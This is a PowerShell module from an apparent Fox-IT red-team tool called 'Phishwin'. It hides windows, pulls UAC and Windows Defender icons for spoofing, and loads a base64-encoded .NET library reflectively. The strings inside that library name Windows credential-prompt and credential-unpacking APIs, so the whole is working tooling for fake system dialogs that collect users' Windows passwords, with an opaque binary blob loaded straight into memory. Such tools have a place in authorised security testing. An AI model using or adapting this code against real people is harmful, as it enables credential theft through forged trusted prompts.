# Fox-IT
# Written by Rindert Kramer

####################
#
# Copyright (c) 2018 Fox-IT
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISNG FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################

function Set-WindowVisibility ([int32[]]$hWnds, [Phishwin.WindowStates]$windowState) {    
    # thx: https://www.go4expert.com/articles/hiding-windows-c-sharp-t973/
    foreach ($hWnd in $hWnds) {
        [void][Phishwin.Window]::ShowWindow($hWnd, $windowState)
    }
}

function Get-Icon ([string]$processPath, [switch]$returnAsPath){

    # Check if path exists. 
    if (-not (Test-Path $processPath)){
        return
    }
    
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($processPath)    
    if (-not $returnAsPath){
        return $icon
    }

    # save extracted icon in %appdata% as bitmap to prevent data/image quality loss
    $savePath = "$([environment]::getfolderpath("LocalApplicationData"))\$(Get-RandomString).bmp"
    $icon.ToBitmap().Save($savePath);

    #$fs = New-Object -TypeName System.IO.FileStream $savePath, ([System.IO.FileMode]::Create)
    #$icon.Save($fs)
    #$fs.Dispose()
    
    $icon.Dispose()
    return $savePath
}

function Export-Icon ([string]$file, [int]$index, [int]$iconSize = 64){

    # Windows information icon
    #$dllPath = 'C:\Windows\system32\imageres.dll'
    #$index = 76
            
    #$dllPath = 'C:\Windows\system32\shell32.dll'
    #$index = 277

    # Windows control panel cog
    #$dllPath = 'C:\Windows\system32\shell32.dll'
    #$index = 316

    # guard UAC icon
    #$dllPath = 'C:\Windows\system32\user32.dll'
    #$index = 6

    # Windows defender - error shield
    #$dllPath = 'C:\Program Files\Windows Defender\EppManifest.dll'
    #$index = 8

    # Windows defender - white shield
    #$dllPath = 'C:\Program Files\Windows Defender\EppManifest.dll'
    #$index = 7

	$icon = [Phishwin.IconExtractor]::Extract($file, $index, $true)

	if ($icon -ne $null){

		# Extract successful, convert to bitmap for high quality
		$bmp = $icon.ToBitmap()
	
		# icon destination file
		$savePath = "$([environment]::getfolderpath("LocalApplicationData"))\$(Get-RandomString).bmp"
	
		# check if icon has correct size
		if ($icon.width -eq $iconSize){
			$bmp.Save($savePath)
		} else {
			# Resize icon
			$newbmp = New-Object System.Drawing.Bitmap($iconSize, $iconSize)
			$graph = [System.Drawing.Graphics]::FromImage($newbmp)
	
			# Make it transparent
			$graph.clear([System.Drawing.Color]::Transparent)
			$graph.DrawImage($bmp,0,0,$iconSize,$iconSize)
	
			$newbmp.Save($savePath)
			$newbmp.Dispose()
		}
	
		$bmp.Dispose()
		return $savePath
	}
}


function Get-RandomString([int]$length = 10){
    $lcase = 'abcdefghijklmnopqrstuvwxyz'
    $ucase = $lcase.ToUpper()
    $combi = ($lcase + $ucase).ToCharArray()

    $sBuilder = New-Object System.Text.StringBuilder

    for ($i = 0; $i -lt $length; $i++){
        [void]$sBuilder.Append($combi[(Get-Random -Minimum 0 -Maximum ($combi.Length -1))])
    }

    return $sBuilder.ToString()
}

function Import-PhishWinLib {

    # thx: https://github.com/rkeithhill/PoshWinRT
    # We use this library to handle events from the toasts.
    # I did not get the winmd references to work with add-type, so we reflect the library from base64
    # The following blob is a b64 representation of the compiled library with some modifications, such as the win32 credentialdialog provider.
    $libB64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAOaOaVsAAAAAAAAAAOAAIiALATAAACAAAAAGAAAAAAAAxj8AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAHQ/AABPAAAAAEAAAPADAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAA8PgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAzB8AAAAgAAAAIAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAPADAAAAQAAAAAQAAAAiAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAJgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACoPwAAAAAAAEgAAAACAAUAlCUAAKgYAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAwApAAAAAQAAEQJ7EQAACgoGCwcDKBIAAAp0AQAAGwwCfBEAAAoIBygBAAArCgYHM98qAAAAEzADACkAAAABAAARAnsRAAAKCgYLBwMoFAAACnQBAAAbDAJ8EQAACggHKAEAACsKBgcz3youAAIUFygVAAAKACoAAAATMAMAYQAAAAIAABEAAnsWAAAKFP4BCgYsCQACA30WAAAKAAJ7FwAAChb+AQsHLAkAAgR9FwAACgACexcAAAosCwJ7FgAAChT+AysBFgwILBsAAnsRAAAKJS0DJisNAgJ7FgAACm8YAAAKAAAqAAAAEzACADYAAAADAAARAhR9FgAACgIWfRcAAAoCKBkAAAoAAAMU/gEKBiwLcgEAAHBzGgAACnoCA3QEAAAbfRsAAAoqAAAbMAIAHAAAAAAAAAAAAAIoHAAACgACFigdAAAKAN4IAigOAAAKANwqARAAAAIAAQASEwAIAAAAACoAAhcoHQAACgAqABMwAgArAAAABAAAEQACexsAAAoU/gEKBiwCKxoDCwcsFQACexsAAApvHgAACgACFH0bAAAKACoAEzABABEAAAAFAAARAAJ7GwAACm8fAAAKCisABioiAigZAAAKACoAABMwAwApAAAABgAAEQJ7IAAACgoGCwcDKBIAAAp0AgAAGwwCfCAAAAoIBygCAAArCgYHM98qAAAAEzADACkAAAAGAAARAnsgAAAKCgYLBwMoFAAACnQCAAAbDAJ8IAAACggHKAIAACsKBgcz3yoAAAATMAIAEgAAAAcAABEAAv4GIQAACnMiAAAKCisABioAABMwBgA3AAAACAAAEQADbyMAAAoKBnIfAABwBCgkAAAKbyUAAAoLBwMXjQYAABslFgIoJgAACqJvJwAACiYCDCsACCqGAAJ7IAAACiUtAyYrEwOMBwAAGwMEcygAAApvKQAACgAqAAAAEzAGAD4AAAAJAAARAHMqAAAKCgIoKwAACowrAAABKCMAAApyHwAAcAMoJAAACm8lAAAKAheNCQAAGyUWBqJvJwAACiYGCysAByoAABswBQAmAAAACgAAEQACAxIAEgEXKBgAAAYmAAQtAwcrAQYoLAAACgzeBiYAFAzeAAgqAAABEAAAAAAOABAeAAYPAAABEzADAC4BAAALAAARAAIoLQAACnQgAAABCgYU/gMLBzkOAQAAAAUTBREFLBYABAwGby4AAAoGby8AAApbBFoNACsGAAQlDQwABggJczAAAApzMQAAChMEEQQU/gMTBhEGOcgAAAAAczIAAAoTBxEEEQcoMwAACm80AAAKAANzNQAAChMIAywHEQgU/gMrARYTCREJOZQAAAAAEQgWbzYAAAoAEQgWbzYAAAoAEQgXbzcAAAoAEQgXbzcAAAoAEQgI0m82AAAKABEICdJvNgAACgARCBZvNgAACgARCBZvNgAACgARCBZvNwAACgARCB8gbzcAAAoAEQgRB284AAAKaW85AAAKABEIHxZvOQAACgARCBEHbzoAAApvOwAACgARCG88AAAKABcTCisLABYTCisFFhMKKwARCioAABMwBAAvAAAADAAAEQACGXM9AAAKCgMacz0AAAoLBgcE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AwALAAYAAAAAAAQASAEAAAAADADkBgEAAAAMALIIAAAAABIASAEAAAAAFgDkBgEAAAAWALIIAAAAAC0A5AYBAAAALQCyCCcAhQAnABoBAAAAPGdldF9UeXBlZEV2ZW50SGFuZGxlcj5iX181XzAASUFzeW5jT3BlcmF0aW9uYDEARXZlbnRIYW5kbGVyYDEAQXN5bmNPcGVyYXRpb25XcmFwcGVyYDEAVXNlcjMyAFR5cGVkRXZlbnRIYW5kbGVyYDIARXZlbnRXcmFwcGVyYDIAPE1vZHVsZT4AU1dfU0hPV05BAEdDAFNXX1NIT1dNSU5JTUlaRUQAU1dfU0hPV01BWElNSVpFRABTV19ISURFAFNXX1JFU1RPUkUAU1dfU0hPV05PQUNUSVZBVEUAU1dfU0hPV01JTk5PQUNUSVZFAFNXX0ZPUkNFTUlOSU1JWkUAU1dfTUlOSU1JWkUAU1dfTUFYSU1JWkUAU1dfTk9STUFMAENSRURVSV9JTkZPAFN5c3RlbS5JTwBTV19TSE9XREVGQVVMVABTV19TSE9XAEV4dHJhY3RJY29uRXhXAHZhbHVlX18AbXNjb3JsaWIASW50ZXJsb2NrZWQAaHduZABHZXRNZXRob2QAcGNjaE1heFBhc3N3b3JkAHBzelBhc3N3b3JkAEZpbGVNb2RlAENvVGFza01lbUZyZWUAYXV0aFBhY2thZ2UASW1hZ2UAaW5wdXRfaW1hZ2UAQ29tcGFyZUV4Y2hhbmdlAEludm9rZQBJRGlzcG9zYWJsZQBSdW50aW1lVHlwZUhhbmRsZQBHZXRUeXBlSGFuZGxlAEZyb21IYW5kbGUAc0ZpbGUAZmlsZQBwc3pEb21haW5OYW1lAHBjY2hNYXhVc2VyTmFtZQBwc3pVc2VyTmFtZQBldmVudE5hbWUAcGNjaE1heERvbWFpbmFtZQBDb21iaW5lAFZhbHVlVHlwZQBHZXRUeXBlAG5vdFVzZWRIZXJlAE1ldGhvZEJhc2UAQ2xvc2UARGlzcG9zZQBEZWxlZ2F0ZQBEZWJ1Z2dlckJyb3dzYWJsZVN0YXRlAFdyaXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnZXJCcm93c2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB2YWx1ZQBmU2F2ZQBSZW1vdmUAY2JTaXplAEluQXV0aEJ1ZmZlclNpemUAcmVmT3V0QXV0aEJ1ZmZlclNpemUAU3VwcHJlc3NGaW5hbGl6ZQBzaXplAGdldF9QbmcAU3lzdGVtLlRocmVhZGluZwBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAU3RyaW5nAGRpc3Bvc2luZwBTeXN0ZW0uRHJhd2luZwBDcmVkZW50aWFsRGlhbG9nAHR5cGVkRXZlbnRBcmcAQXN5bmNPcGVyYXRpb25FdmVudEFyZwBFdmVudEV2ZW50QXJnAEZsdXNoAGdldF9XaWR0aABnZXRfTGVuZ3RoAG9sZTMyLmRsbABTaGVsbDMyLmRsbABjcmVkdWkuZGxsAFBoaXNod2luLmRsbABGaWxlU3RyZWFtAEZyb21TdHJlYW0ATWVtb3J5U3RyZWFtAGlucHV0X3N0cmVhbQBvdXRwdXRfc3RyZWFtAFN5c3RlbQBFbnVtAFBoaXNod2luAGxhcmdlSWNvbgBvdXRwdXRfaWNvbgBwaUxhcmdlVmVyc2lvbgBwaVNtYWxsVmVyc2lvbgBXaW5kb3dzLkZvdW5kYXRpb24AZ2V0X0FzeW5jT3BlcmF0aW9uAF9hc3luY09wZXJhdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBBcmd1bWVudE51bGxFeGNlcHRpb24ASUFzeW5jSW5mbwBNZXRob2RJbmZvAGtlZXBfYXNwZWN0X3JhdGlvAEJpdG1hcABudW1iZXIAU3RyaW5nQnVpbGRlcgBUU2VuZGVyAGdldF9TZW5kZXIAc2VuZGVyAGNiQXV0aEJ1ZmZlcgBJbkF1dGhCdWZmZXIAcEF1dGhCdWZmZXIAcmVmT3V0QXV0aEJ1ZmZlcgBDcmVkVW5QYWNrQXV0aGVudGljYXRpb25CdWZmZXIAZ2V0X1R5cGVkRXZlbnRIYW5kbGVyAGhibUJhbm5lcgBIZWxwZXIAQmluYXJ5V3JpdGVyAFJlZ2lzdGVyAGF1dGhFcnJvcgAuY3RvcgBJY29uRXh0cmFjdG9yAHB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAV2luZG93U3RhdGVzAGR3RmxhZ3MAZmxhZ3MARXZlbnRBcmdzAENyZWRVSVByb21wdEZvcldpbmRvd3NDcmVkZW50aWFscwBhbW91bnRJY29ucwBnZXRfU3RhdHVzAEFzeW5jU3RhdHVzAENvbmNhdABJbWFnZUZvcm1hdABFeHRyYWN0AE9iamVjdAB0YXJnZXQAZ2V0X0hlaWdodABUUmVzdWx0AGdldF9SZXN1bHQAU2V0UmVzdWx0AF9yZXN1bHQAaHduZFBhcmVudABhZGRfQ29tcGxldGVkRXZlbnQAcmVtb3ZlX0NvbXBsZXRlZEV2ZW50AGFkZF9GaXJlRXZlbnQAcmVtb3ZlX0ZpcmVFdmVudABTdGFydABDb252ZXJ0AFN5c3RlbS5UZXh0AHBzek1lc3NhZ2VUZXh0AHBzekNhcHRpb25UZXh0AFNob3dXaW5kb3cAbkNtZFNob3cARXh0cmFjdEljb25FeABpSW5kZXgAVG9BcnJheQBfcmVhZHkAAAAAHWEAcwB5AG4AYwBPAHAAZQByAGEAdABpAG8AbgAACWEAZABkAF8AAAAAAOqhKrQeyG1Fjqtn58LT2TYABCABAQgDIAABBSABARERBCABAQ4EIAEBAgoVEkUBFRIkARMABSABARFNDBUSRQEVEiwCEwATASAHAxUSRQEVEiQBEwAVEkUBFRIkARMAFRJFARUSJAETAAYVEggBEwALBhUS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